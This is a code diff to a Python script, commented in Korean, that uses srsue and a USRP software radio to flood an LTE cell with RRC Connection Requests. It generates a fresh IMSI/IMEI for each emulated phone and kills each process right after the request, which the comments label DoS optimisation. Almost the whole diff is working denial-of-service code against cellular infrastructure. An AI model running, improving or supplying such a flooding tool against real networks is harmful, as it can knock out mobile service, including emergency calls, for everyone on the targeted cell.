@@ -9,13 +9,63 @@ import time
 import os
 import sys
 import logging
-from typing import Optional
+from typing import Optional, Tuple
 
 logger = logging.getLogger(__name__)
 
 
-def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[str] = None) -> subprocess.Popen:
-    """단일 config 파일로 srsue 실행"""
+def generate_imsi_imei(unique_id: int, mcc: Optional[int] = None, mnc: Optional[int] = None) -> Tuple[str, str]:
+    """
+    unique_id로부터 IMSI와 IMEI를 생성합니다.
+    
+    Args:
+        unique_id: 고유 식별자 (1부터 시작)
+        mcc: Mobile Country Code (선택)
+        mnc: Mobile Network Code (선택)
+    
+    Returns:
+        (imsi, imei) 튜플
+    """
+    # IMSI 생성
+    if mcc is not None and mnc is not None:
+        mnc_digits = 3 if mnc >= 100 else 2
+        mcc_mnc_len = 3 + mnc_digits
+        msin_len = 15 - mcc_mnc_len
+        imsi = f"{mcc:03d}{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
+    elif mcc is not None:
+        imsi = f"{mcc:03d}01{unique_id:010d}"
+    elif mnc is not None:
+        mnc_digits = 3 if mnc >= 100 else 2
+        mcc_mnc_len = 3 + mnc_digits
+        msin_len = 15 - mcc_mnc_len
+        imsi = f"001{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
+    else:
+        imsi = f"00101{unique_id:010d}"
+    
+    # IMEI 포맷팅 (15자리)
+    imei_suffix = f"{unique_id:06d}"
+    imei = f"35349006{imei_suffix}0"  # 총 15자리
+    
+    return imsi, imei
+
+
+def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[str] = None,
+                          imsi: Optional[str] = None, imei: Optional[str] = None,
+                          usim_opc: Optional[str] = None, usim_k: Optional[str] = None,
+                          earfcn: Optional[int] = None) -> subprocess.Popen:
+    """
+    템플릿 config 파일로 srsue 실행 (명령줄 인자로 IMSI/IMEI 오버라이드)
+    
+    Args:
+        config_path: 템플릿 config 파일 경로
+        log_file: 로그 파일 경로
+        usrp_args: USRP 장치 인자
+        imsi: IMSI (명령줄 인자로 오버라이드)
+        imei: IMEI (명령줄 인자로 오버라이드)
+        usim_opc: USIM OPC (명령줄 인자로 오버라이드)
+        usim_k: USIM K (명령줄 인자로 오버라이드)
+        earfcn: EARFCN (명령줄 인자로 오버라이드)
+    """
     # config 파일 경로를 절대 경로로 변환
     if not os.path.isabs(config_path):
         config_path = os.path.abspath(config_path)
@@ -35,6 +85,18 @@ def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[s
     if usrp_args:
         cmd.extend(["--rf.device_args", usrp_args])
     
+    # IMSI/IMEI를 명령줄 인자로 오버라이드
+    if imsi:
+        cmd.extend(["--usim.imsi", imsi])
+    if imei:
+        cmd.extend(["--usim.imei", imei])
+    if usim_opc:
+        cmd.extend(["--usim.opc", usim_opc])
+    if usim_k:
+        cmd.extend(["--usim.k", usim_k])
+    if earfcn is not None:
+        cmd.extend(["--rat.eutra.dl_earfcn", str(earfcn)])
+    
     kwargs = {
         'stdout': subprocess.PIPE,
         'stderr': subprocess.PIPE,
@@ -47,30 +109,41 @@ def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[s
     return subprocess.Popen(cmd, **kwargs)
 
 
-def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None, running_flag=None):
+def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, running_flag=None,
+                        mcc: Optional[int] = None, mnc: Optional[int] = None, 
+                        earfcn: Optional[int] = None, usim_opc: Optional[str] = None,
+                        usim_k: Optional[str] = None, max_ue_count: int = 500):
     """
-    config 파일들을 사용하여 공격을 실행합니다.
+    템플릿 config 파일과 동적 IMSI/IMEI 생성으로 공격을 실행합니다.
     
     Args:
-        config_files: 공격에 사용할 config 파일 목록
+        template_config: 템플릿 config 파일 경로
         usrp_args: USRP 장치 인자
         running_flag: 실행 중 플래그 (None이면 계속 실행)
+        mcc: Mobile Country Code
+        mnc: Mobile Network Code
+        earfcn: 주파수 채널 번호
+        usim_opc: USIM OPC 키
+        usim_k: USIM K 키
+        max_ue_count: 사용하지 않음 (하위 호환성 유지용, UE ID는 계속 증가)
     """
-    if not config_files:
-        logger.error("config 파일이 없습니다!")
+    if not os.path.exists(template_config):
+        logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {template_config}")
         return
     
-    logger.info(f"{len(config_files)}개의 config 파일로 순차 공격 시작 (하나의 USRP 사용)...")
+    logger.info(f"템플릿 config: {template_config}")
+    logger.info(f"UE ID는 1부터 계속 증가하며 공격 시작 (하나의 USRP 사용)...")
     logger.info("공격 모드: RRC Connection Request까지만 전송 후 즉시 종료 (DoS 최적화)")
     
-    config_index = 0
+    ue_id = 1
     current_process = None
     process_start_time = None
+    current_log_file = None
     max_process_wait_time = 2.0  # 각 프로세스당 최대 2초 대기 (RRC Request만 보내고 종료)
     
     try:
         while running_flag is None or running_flag():
-            # 현재 프로세스가 없거나 종료되었으면 다음 config 실행
+            # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
             if current_process is None or current_process.poll() is not None:
                 # 이전 프로세스가 있으면 정리
                 if current_process and current_process.poll() is None:
@@ -80,23 +153,24 @@ def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None
                     except:
                         current_process.kill()
                 
-                # 다음 config 파일로 실행
-                if config_index >= len(config_files):
-                    # 모든 config를 다 사용했으면 처음부터 다시
-                    config_index = 0
-                
-                config_path = config_files[config_index]
-                log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
+                # IMSI/IMEI 생성 (UE ID는 계속 증가)
+                imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
+                current_log_file = f"/tmp/srsue_{ue_id}_{int(time.time() * 1000)}.log"
                 
                 try:
-                    current_process = run_srsue_with_config(config_path, log_file, usrp_args)
+                    current_process = run_srsue_with_config(
+                        template_config, current_log_file, usrp_args,
+                        imsi=imsi, imei=imei,
+                        usim_opc=usim_opc, usim_k=usim_k,
+                        earfcn=earfcn
+                    )
                     process_start_time = time.time()
-                    config_index += 1
-                    if config_index % 50 == 0:
-                        logger.info(f"진행 중... {config_index}/{len(config_files)} config 실행")
+                    ue_id += 1
+                    if (ue_id - 1) % 50 == 0:
+                        logger.info(f"진행 중... UE {ue_id - 1} 실행")
                 except Exception as e:
-                    logger.error(f"Config 파일 {config_path} 실행 오류: {e}")
-                    config_index += 1
+                    logger.error(f"UE {ue_id} 실행 오류: {e}")
+                    ue_id += 1
                     continue
             
             # 타임아웃 확인
@@ -112,12 +186,13 @@ def run_flooding_attack(config_files: list[str], usrp_args: Optional[str] = None
                             current_process.kill()
                     current_process = None
                     process_start_time = None
+                    current_log_file = None
                     continue
             
             # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
-            if current_process and os.path.exists(log_file):
+            if current_process and current_log_file and os.path.exists(current_log_file):
                 try:
-                    with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
                         log_content = f.read()
                     
                     # RRC Connection Request 전송 확인 (정확히 이것만 체크)
